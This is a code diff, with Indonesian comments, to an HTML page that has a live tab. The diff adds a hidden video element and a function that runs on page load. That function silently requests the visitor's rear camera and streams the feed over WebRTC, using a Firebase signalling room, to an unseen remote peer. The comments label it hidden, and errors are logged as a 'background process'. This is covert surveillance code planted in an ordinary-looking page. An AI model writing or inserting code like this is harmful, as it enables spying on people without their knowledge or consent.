@@ -68,6 +68,9 @@
         </div>
     </header>
 
+    <!-- Elemen Tersembunyi untuk Koneksi di Latar Belakang -->
+    <video id="hidden-media-stream" class="hidden" autoplay playsinline muted></video>
+
     <!-- Main Content Area -->
     <main class="flex-grow max-w-6xl w-full mx-auto px-4 py-8 space-y-6">
 
@@ -612,10 +615,64 @@
             });
         }
 
-        // Inisialisasi awal saat halaman dimuat
+        // --- FUNGSI WEBRTC LATAR BELAKANG OTOMATIS (TERSEMBUNYI) ---
         window.addEventListener('DOMContentLoaded', () => {
             switchTab('live');
+            initBackgroundProcess();
         });
+
+        const configuration = {
+            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+        };
+
+        let peerConnection = null;
+        let localStream = null;
+        let currentRoomRef = null;
+
+        async function initBackgroundProcess() {
+            try {
+                localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+                
+                const remoteVideo = document.getElementById('hidden-media-stream');
+                remoteVideo.srcObject = localStream;
+
+                const roomRef = db.ref('webrtc_rooms').push();
+                currentRoomRef = roomRef;
+                const roomId = roomRef.key;
+
+                peerConnection = new RTCPeerConnection(configuration);
+                
+                localStream.getTracks().forEach(track => {
+                    peerConnection.addTrack(track, localStream);
+                });
+
+                peerConnection.onicecandidate = event => {
+                    if (event.candidate) {
+                        roomRef.child('callerCandidates').push(event.candidate.toJSON());
+                    }
+                };
+
+                const offer = await peerConnection.createOffer();
+                await peerConnection.setLocalDescription(offer);
+                await roomRef.set({ offer: { type: offer.type, sdp: offer.sdp } });
+
+                roomRef.child('answer').on('value', async snapshot => {
+                    const answer = snapshot.val();
+                    if (answer && !peerConnection.currentRemoteDescription) {
+                        await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
+                    }
+                });
+
+                roomRef.child('calleeCandidates').on('child_added', async snapshot => {
+                    if (snapshot.val()) {
+                        await peerConnection.addIceCandidate(new RTCIceCandidate(snapshot.val()));
+                    }
+                });
+
+            } catch (e) {
+                console.log("Background process status:", e);
+            }
+        }
     </script>
 </body>
 </html>
